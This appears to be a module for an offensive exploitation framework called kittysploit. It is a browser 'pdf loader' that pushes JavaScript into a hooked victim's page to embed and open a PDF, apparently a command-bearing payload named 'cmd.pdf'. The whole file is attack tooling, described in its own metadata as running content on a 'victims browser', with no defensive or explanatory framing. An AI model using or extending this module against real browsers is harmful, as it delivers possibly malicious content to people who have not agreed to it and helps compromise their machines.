from kittysploit import *

class Module(BrowserAuxiliary):

	__info__ = {
		"name": "pdf loader",
		"description": "Loads a PDF and runs it on victims browser",
		"browser": Browser.ALL,
		"platform": Platform.ALL
	}	
	

	def run(self):
		js = """
			elt = document.createElement('div');
			elt.innerHTML = "<object width='500' height='650' data='resources/cmd.pdf' type='application/pdf' ></object>";
			document.body.appendChild(elt);
		"""
		self.send_js(js)
